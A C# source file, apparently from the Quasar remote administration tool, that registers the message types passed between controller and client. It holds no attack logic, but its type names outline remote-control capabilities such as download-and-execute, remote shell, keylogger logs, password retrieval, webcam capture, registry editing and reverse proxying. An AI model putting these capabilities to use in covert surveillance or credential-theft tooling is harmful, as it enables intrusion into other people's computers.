using System;
using System.Collections.Generic;
using System.Linq;

namespace Quasar.Common.Messages
{
    public class PacketRegistry
    {
        public static IEnumerable<Type> GetPacketTypes(Type type)
        {
            return AppDomain.CurrentDomain.GetAssemblies()
                .SelectMany(s => s.GetTypes())
                .Where(p => type.IsAssignableFrom(p) && !p.IsInterface);
        }

        public static Type[] GetPacketTypes()
        {
            return new Type[]
            {
                typeof(GetAuthentication),
                typeof(DoClientDisconnect),
                typeof(DoClientReconnect),
                typeof(DoClientUninstall),
                typeof(DoWebcamStop),
                typeof(DoAskElevate),
                typeof(DoDownloadAndExecute),
                typeof(DoUploadAndExecute),
                typeof(GetDesktop),
                typeof(GetProcesses),
                typeof(DoProcessKill),
                typeof(DoProcessStart),
                typeof(GetDrives),
                typeof(GetDirectory),
                typeof(DoDownloadFile),
                typeof(DoMouseEvent),
                typeof(DoKeyboardEvent),
                typeof(GetSystemInfo),
                typeof(DoVisitWebsite),
                typeof(DoShowMessageBox),
                typeof(DoClientUpdate),
                typeof(GetMonitors),
                typeof(GetWebcams),
                typeof(GetWebcam),
                typeof(DoShellExecute),
                typeof(DoPathRename),
                typeof(DoPathDelete),
                typeof(DoShutdownAction),
                typeof(GetStartupItems),
                typeof(DoStartupItemAdd),
                typeof(DoStartupItemRemove),
                typeof(DoDownloadFileCancel),
                typeof(GetKeyloggerLogs),
                typeof(DoUploadFile),
                typeof(GetPasswords),
                typeof(DoLoadRegistryKey),
                typeof(DoCreateRegistryKey),
                typeof(DoDeleteRegistryKey),
                typeof(DoRenameRegistryKey),
                typeof(DoCreateRegistryValue),
                typeof(DoDeleteRegistryValue),
                typeof(DoRenameRegistryValue),
                typeof(DoChangeRegistryValue),
                typeof(SetAuthenticationSuccess),
                typeof(GetConnections),
                typeof(DoCloseConnection),
                typeof(GetAuthenticationResponse),
                typeof(SetStatus),
                typeof(SetStatusFileManager),
                typeof(SetUserStatus),
                typeof(GetDesktopResponse),
                typeof(GetProcessesResponse),
                typeof(GetDrivesResponse),
                typeof(GetDirectoryResponse),
                typeof(DoDownloadFileResponse),
                typeof(GetSystemInfoResponse),
                typeof(GetMonitorsResponse),
                typeof(GetWebcamsResponse),
                typeof(GetWebcamResponse),
                typeof(DoShellExecuteResponse),
                typeof(GetStartupItemsResponse),
                typeof(GetKeyloggerLogsResponse),
                typeof(GetPasswordsResponse),
                typeof(GetRegistryKeysResponse),
                typeof(GetCreateRegistryKeyResponse),
                typeof(GetDeleteRegistryKeyResponse),
                typeof(GetRenameRegistryKeyResponse),
                typeof(GetCreateRegistryValueResponse),
                typeof(GetDeleteRegistryValueResponse),
                typeof(GetRenameRegistryValueResponse),
                typeof(GetChangeRegistryValueResponse),
                typeof(ReverseProxyConnect),
                typeof(ReverseProxyConnectResponse),
                typeof(ReverseProxyData),
                typeof(ReverseProxyDisconnect),
                typeof(GetConnectionsResponse)

            };
        }
    }
}